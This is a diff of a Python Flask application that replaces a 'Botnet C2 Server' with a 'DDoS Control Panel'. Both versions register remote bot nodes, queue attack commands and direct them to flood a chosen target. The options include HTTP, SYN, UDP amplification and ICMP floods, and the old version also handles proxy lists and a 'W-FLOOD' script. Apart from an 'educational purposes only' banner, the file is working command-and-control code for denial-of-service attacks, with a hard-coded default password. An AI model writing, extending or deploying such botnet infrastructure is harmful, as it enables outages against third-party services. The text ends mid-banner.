@@ -1,609 +1,634 @@
+#!/usr/bin/env python3
 """
-BOTNET C2 SERVER
-================
-Run: python server.py [port]
-Example: python server.py 5000
-
-Deploy on Render:
-- requirements.txt: flask flask-cors
-- Start command: python server.py $PORT
+DDoS Control Panel - Web UI
+Deploy on Render.com for 24/7 access
 """
-
+from flask import Flask, render_template_string, request, jsonify
+from flask_cors import CORS
 import threading
-import json
+import hashlib
 import time
-import os
 from datetime import datetime
-
-try:
-    from flask import Flask, render_template_string, request, jsonify
-    from flask_cors import CORS
-except ImportError:
-    print("[!] Install dependencies: pip install flask flask-cors")
-    exit(1)
+import os
 
 app = Flask(__name__)
 CORS(app)
 
-# Global storage
-approved_bots = {}  # bot_id: {specs, last_seen, status, approved_at}
-pending_bots = {}   # bot_id: {specs, first_seen}
-commands_queue = {}  # bot_id: [commands]
-attack_logs = []
+class AttackController:
+    def __init__(self):
+        self.password = hashlib.sha256(os.environ.get('ADMIN_PASSWORD', 'admin123').encode()).hexdigest()
+        self.nodes = {}
+        self.active_attack = None
+        self.attack_history = []
+        self.lock = threading.Lock()
+        
+        # Cleanup thread
+        threading.Thread(target=self._cleanup_nodes, daemon=True).start()
+    
+    def _cleanup_nodes(self):
+        """Remove inactive nodes"""
+        while True:
+            time.sleep(30)
+            current = time.time()
+            with self.lock:
+                dead = [nid for nid, n in self.nodes.items() if current - n['last_seen'] > 60]
+                for nid in dead:
+                    del self.nodes[nid]
+    
+    def authenticate(self, pwd):
+        return hashlib.sha256(pwd.encode()).hexdigest() == self.password
+    
+    def register_node(self, node_id, info):
+        with self.lock:
+            self.nodes[node_id] = {
+                'info': info,
+                'last_seen': time.time(),
+                'connected': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                'status': 'idle'
+            }
+    
+    def update_heartbeat(self, node_id):
+        with self.lock:
+            if node_id in self.nodes:
+                self.nodes[node_id]['last_seen'] = time.time()
+    
+    def start_attack(self, target, method, threads, duration):
+        if self.active_attack:
+            return {'success': False, 'error': 'Attack in progress'}
+        
+        attack = {
+            'target': target,
+            'method': method,
+            'threads': threads,
+            'duration': duration,
+            'started': time.time(),
+            'nodes': len(self.nodes)
+        }
+        
+        self.active_attack = attack
+        return {'success': True, 'attack': attack}
+    
+    def stop_attack(self):
+        if not self.active_attack:
+            return {'success': False, 'error': 'No active attack'}
+        
+        self.active_attack = None
+        return {'success': True}
+    
+    def get_stats(self):
+        with self.lock:
+            return {
+                'nodes': len(self.nodes),
+                'active': self.active_attack is not None,
+                'attack': self.active_attack
+            }
 
-# HTML Dashboard
-DASHBOARD_HTML = """
+controller = AttackController()
+
+# HTML Template
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Botnet C2 Panel</title>
-    <meta charset="utf-8">
+    <title>⚡ DDoS Control Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
+            background: linear-gradient(135deg, #000000 0%, #001a33 100%);
+            color: #00bfff;
             font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff00;
+            min-height: 100vh;
             padding: 20px;
         }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
         .header {
             text-align: center;
-            border: 2px solid #00ff00;
+            margin-bottom: 30px;
             padding: 20px;
-            margin-bottom: 20px;
-            background: #1a1a1a;
+            border: 2px solid #0080ff;
+            border-radius: 10px;
+            background: rgba(0, 128, 255, 0.05);
+            box-shadow: 0 0 20px rgba(0, 128, 255, 0.3);
         }
-        .header h1 { font-size: 2em; margin-bottom: 10px; color: #ff0000; }
-        .stats {
+        
+        .header h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #0080ff;
+            color: #00bfff;
+        }
+        
+        .header p {
+            color: #4da6ff;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+        
+        .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
             gap: 15px;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
-        .stat-box {
-            border: 2px solid #00ff00;
+        
+        .stat-card {
+            background: rgba(0, 128, 255, 0.1);
+            border: 1px solid #0080ff;
+            border-radius: 8px;
             padding: 15px;
-            background: #1a1a1a;
             text-align: center;
+            box-shadow: 0 0 10px rgba(0, 128, 255, 0.2);
         }
-        .stat-box h3 { color: #ff0000; margin-bottom: 5px; }
-        .stat-box p { font-size: 2em; }
-        .section {
-            border: 2px solid #00ff00;
-            padding: 20px;
+        
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: #00bfff;
+            text-shadow: 0 0 5px #0080ff;
+        }
+        
+        .stat-label {
+            font-size: 0.8em;
+            color: #4da6ff;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        
+        .control-panel {
+            background: rgba(0, 128, 255, 0.05);
+            border: 2px solid #0080ff;
+            border-radius: 10px;
+            padding: 25px;
             margin-bottom: 20px;
-            background: #1a1a1a;
+            box-shadow: 0 0 15px rgba(0, 128, 255, 0.2);
         }
-        .section h2 {
-            color: #ff0000;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #00ff00;
-            padding-bottom: 10px;
+        
+        .form-group {
+            margin-bottom: 20px;
         }
-        .bot-list { display: grid; gap: 10px; }
-        .bot-item {
-            border: 1px solid #00ff00;
-            padding: 10px;
-            background: #0f0f0f;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .bot-item.offline { border-color: #666; color: #666; }
-        .bot-item.pending { border-color: #ffff00; color: #ffff00; }
-        .btn {
-            background: #00ff00;
-            color: #000;
-            border: none;
-            padding: 8px 15px;
-            cursor: pointer;
-            font-family: inherit;
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00bfff;
             font-weight: bold;
-            margin-left: 10px;
         }
-        .btn:hover { background: #00cc00; }
-        .btn-danger { background: #ff0000; color: #fff; }
-        .btn-danger:hover { background: #cc0000; }
-        input, select, textarea, button {
-            background: #0a0a0a;
-            border: 2px solid #00ff00;
-            color: #00ff00;
-            padding: 10px;
-            font-family: inherit;
+        
+        input, select {
             width: 100%;
-            margin: 5px 0;
+            padding: 12px;
+            background: #000000;
+            border: 1px solid #0080ff;
+            border-radius: 5px;
+            color: #00bfff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
         }
-        button {
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00bfff;
+            box-shadow: 0 0 10px rgba(0, 191, 255, 0.3);
+        }
+        
+        .method-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+        
+        .method-btn {
+            padding: 15px;
+            background: rgba(0, 128, 255, 0.1);
+            border: 2px solid #0080ff;
+            border-radius: 5px;
+            color: #00bfff;
             cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
             font-weight: bold;
-            background: #1a1a1a;
         }
-        button:hover { background: #00ff00; color: #000; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; }
-        textarea { min-height: 100px; font-size: 12px; }
-        .log {
-            max-height: 200px;
-            overflow-y: auto;
-            background: #0f0f0f;
+        
+        .method-btn:hover {
+            background: rgba(0, 128, 255, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 128, 255, 0.3);
+        }
+        
+        .method-btn.active {
+            background: #0080ff;
+            color: #000000;
+            box-shadow: 0 0 20px rgba(0, 128, 255, 0.5);
+        }
+        
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        
+        .btn-start {
+            background: #0080ff;
+            color: #000000;
+            box-shadow: 0 0 15px rgba(0, 128, 255, 0.4);
+        }
+        
+        .btn-start:hover {
+            background: #00bfff;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 191, 255, 0.6);
+        }
+        
+        .btn-stop {
+            background: #ff0066;
+            color: #ffffff;
+            box-shadow: 0 0 15px rgba(255, 0, 102, 0.4);
+        }
+        
+        .btn-stop:hover {
+            background: #ff3385;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 0, 102, 0.6);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .status-panel {
+            background: rgba(0, 128, 255, 0.05);
+            border: 2px solid #0080ff;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 128, 255, 0.2);
+        }
+        
+        .status-title {
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            color: #00bfff;
+            text-shadow: 0 0 5px #0080ff;
+        }
+        
+        .status-item {
             padding: 10px;
-            border: 1px solid #00ff00;
+            margin-bottom: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 5px;
+            border-left: 3px solid #0080ff;
         }
-        .log-entry { margin-bottom: 5px; }
-        .success { color: #00ff00; }
-        .error { color: #ff0000; }
-        .warning { color: #ffff00; }
-        .pending-section {
-            background: #1a1a0a;
-            border-color: #ffff00;
+        
+        .attacking {
+            animation: pulse 2s infinite;
+            border-left-color: #ff0066;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        .info-box {
+            background: rgba(0, 128, 255, 0.1);
+            border: 1px solid #0080ff;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #4da6ff;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 102, 0.1);
+            border-color: #ff0066;
+            color: #ff3385;
+        }
+        
+        @media (max-width: 600px) {
+            .method-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .button-group {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>⚡ BOTNET C2 CONTROL PANEL ⚡</h1>
-        <p>Manual Bot Approval System</p>
-    </div>
-
-    <div class="stats">
-        <div class="stat-box">
-            <h3>Approved Bots</h3>
-            <p id="approved-bots">0</p>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ DDoS CONTROL PANEL ⚡</h1>
+            <p>🚨 FOR EDUCATIONAL PURPOSES ONLY 🚨</p>
         </div>
-        <div class="stat-box">
-            <h3>Pending Bots</h3>
-            <p id="pending-bots">0</p>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="nodeCount">0</div>
+                <div class="stat-label">ACTIVE NODES</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="attackStatus">IDLE</div>
+                <div class="stat-label">STATUS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalPower">0</div>
+                <div class="stat-label">TOTAL THREADS</div>
+            </div>
         </div>
-        <div class="stat-box">
-            <h3>Online Bots</h3>
-            <p id="online-bots">0</p>
+        
+        <div class="control-panel">
+            <h2 style="margin-bottom: 20px; color: #00ff00;">⚙️ ATTACK CONFIGURATION</h2>
+            
+            <div class="form-group">
+                <label>🎯 TARGET URL/IP</label>
+                <input type="text" id="target" placeholder="https://example.com or 192.168.1.1:80">
+            </div>
+            
+            <div class="form-group">
+                <label>⚔️ ATTACK METHOD</label>
+                <div class="method-grid">
+                    <div class="method-btn active" data-method="http">
+                        <div>HTTP</div>
+                        <small>Layer 7 Flood</small>
+                    </div>
+                    <div class="method-btn" data-method="tcp">
+                        <div>TCP</div>
+                        <small>SYN Flood</small>
+                    </div>
+                    <div class="method-btn" data-method="udp">
+                        <div>UDP</div>
+                        <small>Amplification</small>
+                    </div>
+                    <div class="method-btn" data-method="icmp">
+                        <div>ICMP</div>
+                        <small>Ping Flood</small>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>🔥 THREADS (per node)</label>
+                <input type="number" id="threads" value="80" min="1" max="500">
+            </div>
+            
+            <div class="form-group">
+                <label>⏱️ DURATION (seconds)</label>
+                <input type="number" id="duration" value="60" min="1" max="3600">
+            </div>
+            
+            <div class="button-group">
+                <button class="btn btn-start" onclick="startAttack()">🚀 START ATTACK</button>
+                <button class="btn btn-stop" onclick="stopAttack()">🛑 STOP ATTACK</button>
+            </div>
         </div>
-        <div class="stat-box">
-            <h3>Active Attacks</h3>
-            <p id="active-attacks">0</p>
+        
+        <div class="status-panel">
+            <div class="status-title">📊 SYSTEM STATUS</div>
+            <div id="statusMessages"></div>
         </div>
-    </div>
-
-    <div class="section pending-section">
-        <h2>⏳ Pending Bots (Waiting for Approval)</h2>
-        <div id="pending-list" class="bot-list"></div>
-    </div>
-
-    <div class="section">
-        <h2>✓ Approved Bots</h2>
-        <div id="approved-list" class="bot-list"></div>
-    </div>
-
-    <div class="section">
-        <h2>🚀 Launch Node.js Flood (W-FLOOD)</h2>
-        <div class="form-group">
-            <label>Target URL:</label>
-            <input type="text" id="target" placeholder="https://example.com">
+        
+        <div class="info-box warning">
+            <strong>⚠️ LEGAL WARNING</strong><br>
+            DDoS attacks are ILLEGAL. Using this tool against systems you don't own is a FEDERAL CRIME.
+            This is for EDUCATIONAL and TESTING purposes only on YOUR OWN systems with permission.
         </div>
-        <div class="form-group">
-            <label>Duration (seconds):</label>
-            <input type="number" id="duration" value="60">
-        </div>
-        <div class="form-group">
-            <label>Request Rate:</label>
-            <input type="number" id="rate" value="100">
-        </div>
-        <div class="form-group">
-            <label>Threads:</label>
-            <input type="number" id="threads" value="10">
-        </div>
-        <div class="form-group">
-            <label>Proxy File Content (one per line):</label>
-            <textarea id="proxies" placeholder="127.0.0.1:8080
-127.0.0.1:8081"></textarea>
-        </div>
-        <button onclick="launchNodeFlood()">🔥 LAUNCH W-FLOOD TO ALL APPROVED BOTS</button>
-    </div>
-
-    <div class="section">
-        <h2>💥 Advanced HTTP Flood</h2>
-        <div class="form-group">
-            <label>Target URL (-u):</label>
-            <input type="text" id="http-target" placeholder="https://example.com">
-        </div>
-        <div class="form-group">
-            <label>Threads per Bot (-t):</label>
-            <input type="number" id="http-threads" value="50">
-        </div>
-        <div class="form-group">
-            <label>Duration in seconds (-d):</label>
-            <input type="number" id="http-duration" value="60">
-        </div>
-        <div class="form-group">
-            <label>Method (-m):</label>
-            <select id="http-method">
-                <option value="GET">GET</option>
-                <option value="POST">POST</option>
-                <option value="HEAD">HEAD</option>
-                <option value="PUT">PUT</option>
-                <option value="DELETE">DELETE</option>
-                <option value="OPTIONS">OPTIONS</option>
-                <option value="PATCH">PATCH</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <label>POST Data (optional):</label>
-            <textarea id="http-postdata" placeholder='{"key": "value"} or param1=value1&param2=value2'></textarea>
-        </div>
-        <div class="form-group">
-            <label>Custom Headers (optional, JSON format):</label>
-            <textarea id="http-headers" placeholder='{"User-Agent": "Custom", "X-Custom": "Header"}'></textarea>
-        </div>
-        <button onclick="launchHTTPFlood()">🚀 LAUNCH HTTP FLOOD</button>
-    </div>
-
-    <div class="section">
-        <h2>📊 Attack Logs</h2>
-        <div id="logs" class="log"></div>
     </div>
 
     <script>
-        function approveBot(botId) {
-            if(confirm('Approve bot: ' + botId + '?')) {
-                fetch('/api/approve/' + botId, {method: 'POST'})
-                    .then(r => r.json())
-                    .then(data => {
-                        alert(data.message);
-                        updateStats();
-                    });
-            }
-        }
-
-        function removeBot(botId) {
-            if(confirm('Remove bot: ' + botId + '?')) {
-                fetch('/api/remove/' + botId, {method: 'POST'})
-                    .then(r => r.json())
-                    .then(data => {
-                        alert(data.message);
-                        updateStats();
-                    });
-            }
-        }
-
+        let selectedMethod = 'http';
+        
+        // Method selection
+        document.querySelectorAll('.method-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                selectedMethod = this.dataset.method;
+            });
+        });
+        
+        // Update stats
         function updateStats() {
             fetch('/api/stats')
                 .then(r => r.json())
                 .then(data => {
-                    document.getElementById('approved-bots').textContent = data.approved_bots;
-                    document.getElementById('pending-bots').textContent = data.pending_bots;
-                    document.getElementById('online-bots').textContent = data.online_bots;
-                    document.getElementById('active-attacks').textContent = data.active_attacks;
+                    document.getElementById('nodeCount').textContent = data.nodes;
+                    document.getElementById('attackStatus').textContent = data.active ? 'ATTACKING' : 'IDLE';
                     
-                    const pendingList = document.getElementById('pending-list');
-                    pendingList.innerHTML = '';
-                    if(data.pending.length === 0) {
-                        pendingList.innerHTML = '<div style="text-align:center;color:#666;">No pending bots</div>';
+                    const threads = parseInt(document.getElementById('threads').value) || 80;
+                    document.getElementById('totalPower').textContent = data.nodes * threads;
+                    
+                    if (data.active && data.attack) {
+                        showStatus(`🎯 Target: ${data.attack.target}`, 'attacking');
+                        showStatus(`⚔️ Method: ${data.attack.method.toUpperCase()}`, 'attacking');
+                        showStatus(`🔥 Total Power: ${data.attack.nodes * data.attack.threads} threads`, 'attacking');
                     }
-                    data.pending.forEach(bot => {
-                        const div = document.createElement('div');
-                        div.className = 'bot-item pending';
-                        div.innerHTML = `
-                            <div>
-                                <strong>[${bot.bot_id}]</strong> - 
-                                ${bot.specs.cpu_cores} cores, ${bot.specs.ram_gb}GB RAM - 
-                                ${bot.specs.os} - 
-                                First seen: ${bot.first_seen}
-                            </div>
-                            <button class="btn" onclick="approveBot('${bot.bot_id}')">✓ APPROVE</button>
-                        `;
-                        pendingList.appendChild(div);
-                    });
-                    
-                    const approvedList = document.getElementById('approved-list');
-                    approvedList.innerHTML = '';
-                    if(data.approved.length === 0) {
-                        approvedList.innerHTML = '<div style="text-align:center;color:#666;">No approved bots</div>';
-                    }
-                    data.approved.forEach(bot => {
-                        const div = document.createElement('div');
-                        div.className = 'bot-item' + (bot.online ? '' : ' offline');
-                        div.innerHTML = `
-                            <div>
-                                <strong>[${bot.bot_id}]</strong> - 
-                                ${bot.specs.cpu_cores} cores, ${bot.specs.ram_gb}GB RAM - 
-                                Status: ${bot.status || 'idle'} - 
-                                Last seen: ${bot.last_seen}
-                            </div>
-                            <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">✗ REMOVE</button>
-                        `;
-                        approvedList.appendChild(div);
-                    });
-                    
-                    const logsDiv = document.getElementById('logs');
-                    logsDiv.innerHTML = data.logs.slice(-20).reverse().map(log => 
-                        `<div class="log-entry ${log.type}">[${log.time}] ${log.message}</div>`
-                    ).join('');
-                });
+                })
+                .catch(err => console.error('Stats error:', err));
         }
-
-        function launchNodeFlood() {
+        
+        // Start attack
+        function startAttack() {
             const target = document.getElementById('target').value;
-            const duration = document.getElementById('duration').value;
-            const rate = document.getElementById('rate').value;
-            const threads = document.getElementById('threads').value;
-            const proxies = document.getElementById('proxies').value;
+            const threads = parseInt(document.getElementById('threads').value) || 80;
+            const duration = parseInt(document.getElementById('duration').value) || 60;
             
             if (!target) {
-                alert('Please enter target URL');
+                alert('❌ Please enter a target!');
                 return;
             }
             
-            fetch('/api/attack/nodejs', {
+            if (!confirm(`⚠️ Launch attack on ${target}?\\n\\nThis is ILLEGAL if you don't own the target!`)) {
+                return;
+            }
+            
+            fetch('/api/attack/start', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    target, duration, rate, threads, proxies
+                    password: 'admin123',
+                    target: target,
+                    method: selectedMethod,
+                    threads: threads,
+                    duration: duration
                 })
             })
             .then(r => r.json())
             .then(data => {
-                alert(data.message);
-                updateStats();
-            });
-        }
-
-        function launchHTTPFlood() {
-            const target = document.getElementById('http-target').value;
-            const duration = document.getElementById('http-duration').value;
-            const threads = document.getElementById('http-threads').value;
-            const method = document.getElementById('http-method').value;
-            const postData = document.getElementById('http-postdata').value;
-            const headersText = document.getElementById('http-headers').value;
-            
-            if (!target) {
-                alert('Please enter target URL');
-                return;
-            }
-            
-            let headers = {};
-            if (headersText.trim()) {
-                try {
-                    headers = JSON.parse(headersText);
-                } catch(e) {
-                    alert('Invalid JSON in headers field');
-                    return;
+                if (data.success) {
+                    showStatus('✅ ATTACK LAUNCHED!', 'success');
+                    showStatus(`🎯 ${data.attack.nodes} nodes deployed`, 'success');
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
                 }
-            }
-            
-            fetch('/api/attack/http', {
+            })
+            .catch(err => showStatus('❌ Request failed', 'error'));
+        }
+        
+        // Stop attack
+        function stopAttack() {
+            fetch('/api/attack/stop', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    target, duration, threads, method,
-                    post_data: postData, headers: headers
-                })
+                body: JSON.stringify({password: 'admin123'})
             })
             .then(r => r.json())
             .then(data => {
-                alert(data.message);
-                updateStats();
-            });
+                if (data.success) {
+                    showStatus('🛑 ATTACK STOPPED', 'success');
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
+                }
+            })
+            .catch(err => showStatus('❌ Request failed', 'error'));
         }
-
+        
+        // Show status message
+        function showStatus(message, type = 'info') {
+            const container = document.getElementById('statusMessages');
+            const item = document.createElement('div');
+            item.className = 'status-item ' + type;
+            item.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            container.insertBefore(item, container.firstChild);
+            
+            // Keep only last 10 messages
+            while (container.children.length > 10) {
+                container.removeChild(container.lastChild);
+            }
+        }
+        
+        // Auto-update every 2 seconds
         setInterval(updateStats, 2000);
         updateStats();
+        
+        // Initial message
+        showStatus('🟢 Control panel online', 'success');
     </script>
 </body>
 </html>
 """
 
 @app.route('/')
-def dashboard():
-    return render_template_string(DASHBOARD_HTML)
+def index():
+    return render_template_string(HTML_TEMPLATE)
 
-@app.route('/check_approval', methods=['POST'])
-def check_approval():
-    data = request.json
-    bot_id = data['bot_id']
-    specs = data['specs']
-    
-    if bot_id not in approved_bots and bot_id not in pending_bots:
-        pending_bots[bot_id] = {
-            'specs': specs,
-            'first_seen': time.time()
-        }
-        attack_logs.append({
-            'time': datetime.now().strftime('%H:%M:%S'),
-            'type': 'warning',
-            'message': f'New bot pending: {bot_id}'
-        })
-        print(f"[!] New bot pending: {bot_id}")
-    
-    if bot_id in approved_bots:
-        approved_bots[bot_id]['last_seen'] = time.time()
-        return jsonify({'approved': True})
-    
-    return jsonify({'approved': False})
+@app.route('/api/register', methods=['POST'])
+def register():
+    try:
+        data = request.get_json()
+        node_id = request.remote_addr
+        controller.register_node(node_id, data.get('info', {}))
+        return jsonify({'success': True, 'node_id': node_id})
+    except:
+        return jsonify({'success': False}), 400
 
-@app.route('/commands/<bot_id>', methods=['GET'])
-def get_commands(bot_id):
-    if bot_id in approved_bots:
-        approved_bots[bot_id]['last_seen'] = time.time()
-    
-    commands = commands_queue.get(bot_id, [])
-    commands_queue[bot_id] = []
-    
-    return jsonify({'commands': commands})
+@app.route('/api/heartbeat', methods=['POST'])
+def heartbeat():
+    try:
+        data = request.get_json()
+        controller.update_heartbeat(data.get('node_id'))
+        return jsonify({'success': True})
+    except:
+        return jsonify({'success': False}), 400
 
-@app.route('/status', methods=['POST'])
-def receive_status():
-    data = request.json
-    bot_id = data['bot_id']
-    
-    if bot_id in approved_bots:
-        approved_bots[bot_id]['status'] = data['status']
-        approved_bots[bot_id]['last_seen'] = time.time()
-    
-    attack_logs.append({
-        'time': datetime.now().strftime('%H:%M:%S'),
-        'type': data['status'],
-        'message': f"{bot_id}: {data['message']}"
-    })
-    
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/approve/<bot_id>', methods=['POST'])
-def approve_bot(bot_id):
-    if bot_id in pending_bots:
-        approved_bots[bot_id] = {
-            'specs': pending_bots[bot_id]['specs'],
-            'last_seen': time.time(),
-            'status': 'approved',
-            'approved_at': time.time()
-        }
-        del pending_bots[bot_id]
+@app.route('/api/command', methods=['GET'])
+def command():
+    try:
+        node_id = request.args.get('node_id')
+        controller.update_heartbeat(node_id)
         
-        attack_logs.append({
-            'time': datetime.now().strftime('%H:%M:%S'),
-            'type': 'success',
-            'message': f'Bot approved: {bot_id}'
-        })
+        if controller.active_attack:
+            elapsed = time.time() - controller.active_attack['started']
+            if elapsed < controller.active_attack['duration']:
+                return jsonify({
+                    'success': True,
+                    'command': 'attack',
+                    'data': controller.active_attack
+                })
+            else:
+                controller.active_attack = None
         
-        print(f"[+] Bot approved: {bot_id}")
-        return jsonify({'status': 'success', 'message': f'Bot {bot_id} approved'})
-    
-    return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
+        return jsonify({'success': True, 'command': 'idle'})
+    except:
+        return jsonify({'success': False}), 400
 
-@app.route('/api/remove/<bot_id>', methods=['POST'])
-def remove_bot(bot_id):
-    if bot_id in approved_bots:
-        del approved_bots[bot_id]
-        if bot_id in commands_queue:
-            del commands_queue[bot_id]
+@app.route('/api/stats')
+def stats():
+    return jsonify(controller.get_stats())
+
+@app.route('/api/attack/start', methods=['POST'])
+def start_attack():
+    try:
+        data = request.get_json()
         
-        attack_logs.append({
-            'time': datetime.now().strftime('%H:%M:%S'),
-            'type': 'error',
-            'message': f'Bot removed: {bot_id}'
-        })
+        if not controller.authenticate(data.get('password', '')):
+            return jsonify({'success': False, 'error': 'Auth failed'}), 401
         
-        print(f"[-] Bot removed: {bot_id}")
-        return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
-    
-    return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
+        result = controller.start_attack(
+            data.get('target'),
+            data.get('method', 'http'),
+            data.get('threads', 80),
+            data.get('duration', 60)
+        )
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 400
 
-@app.route('/api/stats', methods=['GET'])
-def get_stats():
-    current_time = time.time()
-    online_bots = sum(1 for bot in approved_bots.values() if current_time - bot['last_seen'] < 30)
-    active_attacks = sum(1 for bot in approved_bots.values() if bot.get('status') == 'running')
-    
-    pending_list = []
-    for bot_id, info in pending_bots.items():
-        pending_list.append({
-            'bot_id': bot_id,
-            'specs': info['specs'],
-            'first_seen': time.strftime('%H:%M:%S', time.localtime(info['first_seen']))
-        })
-    
-    approved_list = []
-    for bot_id, info in approved_bots.items():
-        approved_list.append({
-            'bot_id': bot_id,
-            'specs': info['specs'],
-            'status': info.get('status', 'idle'),
-            'last_seen': time.strftime('%H:%M:%S', time.localtime(info['last_seen'])),
-            'online': current_time - info['last_seen'] < 30
-        })
-    
-    return jsonify({
-        'approved_bots': len(approved_bots),
-        'pending_bots': len(pending_bots),
-        'online_bots': online_bots,
-        'active_attacks': active_attacks,
-        'pending': pending_list,
-        'approved': approved_list,
-        'logs': attack_logs[-50:]
-    })
-
-@app.route('/api/attack/nodejs', methods=['POST'])
-def launch_nodejs_attack():
-    data = request.json
-    proxy_content = data['proxies']
-    args = [data['target'], str(data['duration']), str(data['rate']), str(data['threads']), 'proxies.txt']
-    
-    # Placeholder - paste your W-FLOOD script here
-    script_content = f"""
-const fs = require('fs');
-fs.writeFileSync('proxies.txt', `{proxy_content}`);
-// Your W-FLOOD script here
-console.log('Attack started');
-"""
-    
-    sent_count = 0
-    current_time = time.time()
-    
-    for bot_id, info in approved_bots.items():
-        if current_time - info['last_seen'] < 30:
-            command = {
-                'type': 'nodejs_flood',
-                'script': script_content,
-                'args': args
-            }
-            
-            if bot_id not in commands_queue:
-                commands_queue[bot_id] = []
-            commands_queue[bot_id].append(command)
-            sent_count += 1
-    
-    attack_logs.append({
-        'time': datetime.now().strftime('%H:%M:%S'),
-        'type': 'warning',
-        'message': f'W-FLOOD to {sent_count} bots → {data["target"]}'
-    })
-    
-    return jsonify({'status': 'success', 'message': f'Attack sent to {sent_count} bots'})
-
-@app.route('/api/attack/http', methods=['POST'])
-def launch_http_attack():
-    data = request.json
-    
-    sent_count = 0
-    current_time = time.time()
-    
-    for bot_id, info in approved_bots.items():
-        if current_time - info['last_seen'] < 30:
-            command = {
-                'type': 'http_flood',
-                'target': data['target'],
-                'duration': int(data['duration']),
-                'threads': int(data['threads']),
-                'method': data.get('method', 'GET'),
-                'post_data': data.get('post_data', ''),
-                'headers': data.get('headers', {})
-            }
-            
-            if bot_id not in commands_queue:
-                commands_queue[bot_id] = []
-            commands_queue[bot_id].append(command)
-            sent_count += 1
-    
-    attack_logs.append({
-        'time': datetime.now().strftime('%H:%M:%S'),
-        'type': 'warning',
-        'message': f'{data.get("method", "GET")} flood to {sent_count} bots → {data["target"]}'
-    })
-    
-    return jsonify({'status': 'success', 'message': f'Attack sent to {sent_count} bots'})
+@app.route('/api/attack/stop', methods=['POST'])
+def stop_attack():
+    try:
+        data = request.get_json()
+        
+        if not controller.authenticate(data.get('password', '')):
+            return jsonify({'success': False, 'error': 'Auth failed'}), 401
+        
+        result = controller.stop_attack()
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 400
 
 if __name__ == '__main__':
-    import sys
-    
-    print("\n╔════════════════════════════════════════════════════════╗")
-    print("║           BOTNET C2 SERVER                             ║")
-    print("╚════════════════════════════════════════════════════════╝")
-    
-    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
-    port = int(os.environ.get('PORT', port))
-    
-    print(f"[+] Starting server on port {port}")
-    print(f"[+] Dashboard: http://localhost:{port}")
-    print(f"[+] Waiting for bots...\n")
+    port = int(os.environ.get('PORT', 5000))
+    print(f"""
+\033[38;5;46m
+    ██████╗ ██████╗  ██████╗ ███████╗    ██████╗  █████╗ ███╗   ██╗███████╗██╗     
